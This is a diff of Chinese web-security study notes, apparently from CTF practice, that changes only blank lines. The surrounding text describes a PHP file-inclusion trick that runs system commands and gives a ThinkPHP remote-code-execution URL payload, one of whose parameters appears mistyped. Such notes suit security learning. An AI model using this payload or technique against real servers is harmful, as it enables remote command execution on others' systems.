@@ -28,8 +28,7 @@
 
   利用**文件包含**将`page`后面的参数全部当做php来执行，此时该文件应该在本地服务器且为`index.php`。又因为存在`echo $_GET["hello"];`以`get`方法接收`hello`，又因为**文件包含**将`hello`后面的值当做代码执行，调用系统命令。
 
-- 
-
+  
 
 
 ***XFF(X-Forwarded-For)***代表客户端，也就是HTTP的请求端真实的ip，只有在通过了HTTP代理或者负载均衡服务器时才会添加该项。
@@ -43,6 +42,8 @@
 ThinkPHP远程代码执行：
 
 `/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&var[1]]=(系统命令)`
+
+
 
 
 
